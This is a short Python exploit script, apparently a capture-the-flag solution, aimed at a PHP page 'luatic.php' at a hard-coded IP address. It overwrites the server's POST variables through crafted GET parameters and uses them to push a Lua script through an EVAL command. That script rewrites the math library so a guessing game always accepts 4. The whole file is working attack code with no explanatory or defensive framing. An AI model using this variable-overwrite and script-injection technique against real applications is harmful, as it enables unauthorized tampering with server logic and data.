import requests

url = 'http://54.250.242.183/luatic.php'

token = '4c5d472b-2ff1-455a-a01d-69d58b4f1f0c'

lua = 'setmetatable(_G, nil) \
 for k, v in pairs(math) \
   do rawset(math, k, function() return 4 end) \
 end'


def send(script=None, arg1=None, arg2=None):
    params = {
        'token': token,
        'guess': 4,
    }
    if script:
        params.update({
            '_POST[MY_SET_COMMAND]': script,
            '_POST[TEST_KEY]': arg1,
            '_POST[TEST_VALUE]': arg2,
        })
    return requests.get(url, params=params).text


if __name__ == '__main__':
    print(send("EVAL", lua, "0"))
    print(send())
